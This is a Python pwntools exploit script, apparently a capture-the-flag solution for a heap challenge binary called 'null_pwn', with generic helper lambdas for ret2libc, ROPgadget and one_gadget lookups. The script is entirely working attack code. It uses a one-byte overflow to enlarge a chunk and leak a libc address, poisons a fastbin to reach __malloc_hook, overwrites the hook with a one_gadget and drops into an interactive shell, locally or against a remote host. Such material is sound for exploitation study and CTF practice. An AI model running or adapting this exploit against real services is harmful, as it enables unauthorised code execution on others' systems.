#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/04 12:13:25
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess

arglen = len(sys.argv)
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda rv,data : io.sendafter(rv,data)
sl = lambda data : io.sendline(data)
sla = lambda rv,data : io.sendlineafter(rv,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
dbg = lambda point=null: (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og = lambda binary : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg = lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc = lambda leak,func : leak - libc.sym[func]
libcpath = lambda binary : subprocess.check_output(['ldd',binary]).decode().replace('\t', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep *.so'],shell=True).decode().replace('\n', '')
proc = lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})

# context.arch='amd64'
# context.log_level='debug'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
# 0直接略过所有dbg
DEBUG = 0
# 0表示使用当前目录下的libc，1表示使用patcher之后的glibc
GLIBC = 1
binary = './null_pwn'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def cmd(index):
    sla(":",str(index))

def add(index,size,content="a"):
    cmd(1)
    sla("Index",str(index))
    sla("Heap",str(size))
    sa("Content?:",content)

def free(index):
    cmd(2)
    sla("Index",str(index))

def edit(index,content):
    cmd(3)
    sla("Index:",str(index))
    sa("Content?:",content)

def show(index):
    cmd(4)
    sla("Index :",str(index))

add(0,0x18)
add(1,0x78)
add(2,0x68)
add(3,0x68)
add(4,0x68)
dbg()
edit(0,b"\x00"*0x18+b"\xf1")
dbg()
free(1)
add(5,0x78)
show(5)
ru("Content : ")
libc.address = uu64(r(6)) - (0x7fc3ad748c61-0x7fc3ad384000)
leak("base",libc.address)

malloc_hook = libc.sym["__malloc_hook"]
add(6,0x68)
free(6)
edit(2,p64(malloc_hook-0x23))   # 2->6
add(7,0x68)
add(8,0x68)
ogs = og(libc.path)
edit(8,b"c"*19+p64(ogs[3]+libc.address))
dbg()

cmd(1)
sla(":","9")
sla(":","0x8")

ia()